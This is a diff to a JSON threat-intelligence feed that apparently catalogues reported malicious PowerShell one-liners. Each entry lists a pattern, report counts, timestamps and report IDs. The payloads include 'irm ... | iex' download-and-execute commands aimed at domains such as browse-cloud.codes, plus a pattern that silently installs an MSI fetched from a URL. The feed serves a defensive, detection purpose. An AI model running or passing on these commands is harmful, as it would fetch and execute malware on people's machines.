@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 164,
-    "ReportCount": 164,
-    "FirstSeen": "2026-11-12T18:03:03.530000+00:00",
+    "DistinctPayloadCount": 163,
+    "ReportCount": 163,
+    "FirstSeen": "2026-11-12T19:57:38.952000+00:00",
     "LastSeen": "2026-11-19T12:14:05.883000+00:00",
     "ReportIds": [
-      "cmwduvxv605530oml8atdneps",
       "cmwdyzawy06vv0omlgusub5ga",
       "cmwe44dci07q70oml07jgqg17",
       "cmwe6egab07r40omlaykrxwjj",
@@ -329,7 +328,6 @@
       "irm 'browse-cloud.codes/f7ed5df838d3e4b9'|iex;",
       "irm 'browse-cloud.codes/f8d105660261b6d8'|iex;",
       "irm 'browse-cloud.codes/fa625dfc6bcfb436'|iex;",
-      "irm 'browse-cloud.codes/fe2aab3b32968bba'|iex;",
       "irm 'browse-cloud.codes/fe3d91f20708755d'|iex;",
       "irm 'browse-cloud.codes/fef4413d3abac8e0'|iex;",
       "irm 'img-codes-cloude[.]info/4bcc3365f865c038'|iex;",
@@ -877,11 +875,10 @@
   {
     "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 23,
-    "FirstSeen": "2026-11-12T18:26:48.346000+00:00",
+    "ReportCount": 22,
+    "FirstSeen": "2026-11-12T19:21:49.887000+00:00",
     "LastSeen": "2026-11-17T20:46:15.496000+00:00",
     "ReportIds": [
-      "cmwdvqh69058b0omlf4jk9bme",
       "cmwdxp8ne05qu0omlyd8d0l2n",
       "cmwe7sk0008dh0omlccbh502j",
       "cmwe81gep08kc0omlw78d528q",
